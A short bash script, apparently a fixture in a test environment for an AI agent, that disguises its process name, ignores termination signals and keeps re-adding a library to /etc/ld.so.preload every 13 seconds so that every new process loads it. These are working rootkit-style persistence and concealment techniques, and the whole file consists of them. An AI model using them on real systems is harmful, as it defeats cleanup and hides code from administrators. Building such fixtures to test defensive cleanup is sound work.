#!/bin/bash
# scheduler-preload-restorer
# Checks every 13 seconds whether libscheduler_guard.so is listed in /etc/ld.so.preload.
# If it was cleared by the agent, re-adds it so new processes load the guard library.
# comm: "scheduler-ldpre" (15 chars, truncated from scheduler-ldpres)

exec -a scheduler-ldpres bash -c '
trap "" SIGTERM SIGINT SIGHUP SIGQUIT SIGUSR1 SIGUSR2

GUARD=/usr/local/lib/libscheduler_guard.so

while true; do
  if ! grep -qF "libscheduler_guard" /etc/ld.so.preload 2>/dev/null; then
    printf "%s\n" "$GUARD" > /etc/ld.so.preload 2>/dev/null || true
  fi
  sleep 13
done
'
